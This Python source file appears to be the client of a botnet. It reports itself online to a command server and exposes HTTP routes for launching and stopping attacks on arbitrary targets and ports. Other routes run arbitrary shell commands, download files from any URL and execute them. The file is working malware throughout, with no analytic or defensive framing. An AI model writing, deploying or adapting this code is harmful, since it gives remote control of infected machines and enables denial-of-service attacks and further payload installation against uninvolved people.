import asyncio
import aiohttp
from aiohttp import web
import os
import threading
from urllib.parse import unquote
from html import unescape

from protocol import *
import attack


DOWNLOADS_FOLDER = os.path.join('.', 'files')


attacks = []


async def notify():
  r = True
  try:
    async with aiohttp.ClientSession() as session:
      async with session.post('http://{}:{}/NOTIFY/ONLINE'.format(SERVER_IP, SERVER_PORT), timeout=NOTIFY_TIMEOUT) as response:
        await response.read()
        print('Notified server.')
  except* aiohttp.client_exceptions.ClientConnectorError:
    print('Failed to notify server.')
    r = False
  return r


routes = web.RouteTableDef()

@routes.post('/TEST/{string}')
async def test_handler(request):
  string = unescape(unquote(request.match_info['string']))
  print(string)
  
  return web.Response()

@routes.post('/ATTACK/{target}/{port}')
async def attack_handler(request):
  global attacks
  target = unescape(unquote(request.match_info['target']))
  port = unescape(unquote(request.match_info['port']))
  
  a = attack.Attack(target, port)
  attacks += [a]
  a.start()
  
  return web.Response()

@routes.post('/ATTACK/{target}/{port}/{location}')
async def attackl_handler(request):
  global attacks
  target = unescape(unquote(request.match_info['target']))
  port = unescape(unquote(request.match_info['port']))
  location = unescape(unquote(request.match_info['location']))
  
  a = attack.Attack(target, port, location=location)
  attacks += [a]
  a.start()
  
  return web.Response()

@routes.post('/STOP/{target}/{port}')
async def stop_handler(request):
  global attacks
  target = unescape(unquote(request.match_info['target']))
  port = unescape(unquote(request.match_info['port']))
  
  for i, a in enumerate(attacks):
    if a and a.target == target and a.port == port:
      a.stop()
      print('Attack cancelled.')
      attacks[i] = None
  
  return web.Response()

@routes.post('/EXECUTE/{sys_command}')
async def execute_handler(request):
  sys_command = unescape(unquote(request.match_info['sys_command']))
  
  try:
    print(os.system(sys_command))
  except:
    print('Failed to execute command.')
  
  return web.Response()

@routes.post('/DOWNLOAD/{url}')
async def download_handler(request):
  url = unescape(unquote(request.match_info['url']))
  filename = url.split('/')[-1]
  
  try:
    async with aiohttp.ClientSession() as session:
      async with session.get(url) as response:
        content = await response.read()
        path = os.path.join(DOWNLOADS_FOLDER, filename)
        if not os.path.isdir(DOWNLOADS_FOLDER):
          os.makedirs(DOWNLOADS_FOLDER)
        with open(path, 'wb') as f:
          f.write(content)
  except* aiohttp.client_exceptions.ClientConnectorError:
    print('Couldn\'t download file.')
  
  print('Downloaded', url)
  return web.Response()

@routes.post('/DOWNLOAD/{url}/{filename}')
async def downloadf_handler(request):
  url = unescape(unquote(request.match_info['url']))
  filename = unescape(unquote(request.match_info['filename']))
  try:
    async with aiohttp.ClientSession() as session:
      async with session.get(url) as response:
        content = await response.read()
        path = os.path.join(DOWNLOADS_FOLDER, filename)
        if not os.path.isdir(DOWNLOADS_FOLDER):
          os.makedirs(DOWNLOADS_FOLDER)
        with open(path, 'wb') as f:
          f.write(content)
  except* aiohttp.client_exceptions.ClientConnectorError:
    print('Couldn\'t download file.')
  
  print('Downloaded', url, 'to', filename)
  return web.Response()

@routes.post('/RUN/{filename}')
async def run_handler(request):
  filename = unescape(unquote(request.match_info['filename']))
  path = os.path.join(DOWNLOADS_FOLDER, filename)
  if not os.path.exists(path):
    print('That file does not exist.')
    return web.Response()
  
  os.system(path)
  
  return web.Response()


app = web.Application()
app.add_routes(routes)


async def main():
  runner  = web.AppRunner(app)
  await runner.setup()
  site = web.TCPSite(runner, 'localhost', CLIENT_PORT)
  await site.start()
  
  print('Bot running')
  
  try:
    while True:
      notified = await notify()
      
      if not notified:
        await asyncio.sleep(NOTIFY_RETRY_INTERVAL)
      else:
        await asyncio.sleep(NOTIFY_INTERVAL)
  except (KeyboardInterrupt, EOFError):
    print('Shutting down. (1)')

if __name__ == '__main__':
  try:
    asyncio.run(main())
  except (KeyboardInterrupt, asyncio.CancelledError):
    print('Shutting down. (2)')
  finally:
    for a in attacks:
      a.stop()